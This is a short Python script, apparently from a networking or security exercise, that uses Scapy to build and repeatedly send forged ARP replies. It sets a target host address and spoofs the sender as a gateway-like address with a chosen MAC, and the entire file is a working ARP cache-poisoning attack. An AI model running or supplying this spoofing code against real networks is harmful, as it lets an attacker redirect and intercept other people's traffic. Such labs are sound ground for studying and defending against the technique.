from scapy.all import *

myAttack = ARP()
myAttack.show()

myAttack.pdst='10.104.0.56'
# myAttack.show()

myAttack.hwsrc='f0:18:98:3d:8e:1a'
myAttack.psrc='10.104.255.254'
myAttack.show()

srloop(myAttack)